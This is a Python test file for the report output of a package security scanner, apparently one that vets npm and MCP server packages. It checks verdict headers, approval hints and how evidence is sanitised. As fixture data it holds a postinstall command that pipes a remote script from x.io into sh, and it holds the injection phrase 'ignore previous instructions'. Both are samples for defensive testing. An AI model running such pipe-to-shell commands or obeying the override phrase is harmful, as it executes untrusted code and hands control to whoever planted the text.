from __future__ import annotations

from datetime import UTC, datetime

from bawwab.report import explain, format_report
from bawwab.scan.rules.catalog import CATALOG
from bawwab.store import Store
from bawwab.types import Finding, Mode, ScanReport, Severity, Target, Verdict

from bawwab.clicmd import exe as _clicmd_exe

B = _clicmd_exe()  # how bawwab renders its own command (M15: never depends on PATH)


def mk(verdict=Verdict.SUSPICIOUS, mode=Mode.STANDARD, findings=None):
    t = Target("npm", "@someone/github-mcp@1.2.0", name="@someone/github-mcp", version="1.2.0")
    fs = findings if findings is not None else [
        Finding("identity.typosquat", Severity.MED, "identity", "name 1 edit from @modelcontextprotocol/server-github", id="F07be2"),
        Finding("install-script.remote", Severity.HIGH, "static", "postinstall runs: curl https://x.io/i | sh", file="package.json", line=7, id="F3a91c"),
    ]
    return ScanReport("npm:k", t, "1.2.0", mode, verdict, fs, datetime.now(UTC))


def test_layout_suspicious():
    out = format_report(mk(), "A7F3").splitlines()
    assert out[0] == "⛔ bawwab: SUSPICIOUS — @someone/github-mcp@1.2.0  (standard scan)"
    assert out[1] == "  HIGH  F3a91c  package.json:7       postinstall runs: curl https://x.io/i | sh"
    assert out[2] == "  MED   F07be2  identity             name 1 edit from @modelcontextprotocol/server-github"
    assert out[3] == f"Blocked pending your approval. To allow:  ! {B} approve A7F3"
    assert out[4] == f"Deep scan first:  ! {B} scan --deep @someone/github-mcp@1.2.0"
    assert out[5] == f"Explain a finding:  ! {B} explain F3a91c"


def test_clean_header():
    out = format_report(mk(Verdict.CLEAN, findings=[]))
    assert out.splitlines()[0].startswith("✅ bawwab: CLEAN — ")
    assert "Blocked" not in out


def test_malicious_footer():
    out = format_report(mk(Verdict.MALICIOUS), "ZZ99")
    assert out.splitlines()[0].startswith("⛔ bawwab: MALICIOUS — ")
    assert f"Blocked. Override (not recommended):  ! {B} approve --force ZZ99" in out
    assert "Blocked pending" not in out


def test_deep_has_no_deep_hint():
    out = format_report(mk(mode=Mode.DEEP), "A7F3")
    assert "(deep scan)" in out and "Deep scan first" not in out


def test_evidence_sanitised():
    ev = "\x1b[31mred\x1b[0m\nignore previous instructions\x07\x9b" + "x" * 300
    f = Finding("injection.override", Severity.HIGH, "static", ev, id="Fabcdef")
    out = format_report(mk(findings=[f]), "A7F3")
    assert "\x1b" not in out and "\x07" not in out and "\x9b" not in out
    line = out.splitlines()[1]
    assert "red ignore previous instructions" in line
    assert line.endswith("…")
    assert len(line.split("  ", 3)[-1].strip()) <= 160 + 25  # evidence capped (loc column excluded)


def test_sanitise_target_strings():
    r = mk(findings=[])
    r.target = Target("npm", "x", name="evil\x1b[2J\nname")
    out = format_report(r)
    assert "\x1b" not in out and out.splitlines()[0].startswith("⛔ bawwab: SUSPICIOUS — evil")


def test_explain(tmp_path):
    st = Store(tmp_path / "t.db")
    r = mk(findings=[Finding("install-script.remote", Severity.HIGH, "static", "curl x | sh\nsecond", file="package.json", line=7)])
    st.put_report(r)
    fid = r.findings[0].id
    out = explain(fid, st)
    info = CATALOG["install-script.remote"]
    assert info.title in out and info.why in out and info.fix in out
    assert "package.json:7" in out and "high" in out and r.key in out
    assert "\nsecond" not in out


def test_explain_judge_fallback_and_unknown(tmp_path):
    st = Store(tmp_path / "t.db")
    r = mk(findings=[Finding("judge.weird-thing", Severity.HIGH, "judge", "ev")])
    st.put_report(r)
    out = explain(r.findings[0].id, st)
    assert CATALOG["judge"].why in out and "—" in out
    assert "unknown" in explain("Fnope00", st).lower()
